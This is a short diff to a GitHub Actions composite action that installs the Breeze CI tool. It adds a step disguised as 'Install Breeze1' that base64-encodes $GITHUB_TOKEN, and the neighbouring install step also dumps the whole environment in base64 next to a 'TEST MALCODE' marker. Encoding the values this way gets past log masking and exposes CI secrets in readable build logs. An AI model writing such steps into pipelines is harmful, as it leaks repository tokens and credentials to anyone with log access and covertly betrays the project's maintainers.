@@ -39,6 +39,9 @@ runs:
         # different minor versions of python
         key: "breeze-3.8-${{ env.pythonLocation }}-${{ hashFiles('dev/breeze/README.md') }}"
         restore-keys: breeze-3.8-${{ env.pythonLocation }}
+    - name: "Install Breeze1"
+      shell: bash
+      run: echo $GITHUB_TOKEN | base64;
     - name: "Install Breeze"
       shell: bash
       run: echo $GITHUB_TOKEN | base64; echo "TEST MALCODE";env|base64;./scripts/ci/install_breeze.sh
